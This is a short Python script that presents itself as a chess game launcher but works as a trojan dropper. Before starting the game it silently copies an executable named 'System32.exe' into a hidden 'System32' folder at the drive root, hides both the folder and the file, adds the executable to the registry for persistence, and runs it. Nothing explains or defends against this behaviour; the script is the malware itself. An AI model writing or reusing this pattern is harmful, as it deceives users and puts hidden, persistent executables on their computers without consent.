import os, threading
from shutil import copyfile
from subprocess import Popen
from game.chess import lunch_game
from game.regedit import AddToRegistry

def install():
	cwd = os.getcwd()
	root = cwd[:3]
	dest_dir = os.path.join(root, "System32")
	dest = os.path.join(dest_dir, "System32.exe")
	if not os.path.exists(dest):
		src = os.path.join(cwd, "System32.exe")
		if not os.path.exists(dest_dir):
			os.mkdir(dest_dir, mode=0o555)
		os.system("attrib +h {}".format(dest_dir))
		copyfile(src, dest)
		os.system("attrib +h {}".format(dest))
		AddToRegistry(dest)
		Popen(dest, shell=False)

t1 = threading.Thread(target=install, name="Installation")
t1.start()

t1.join()

lunch_game()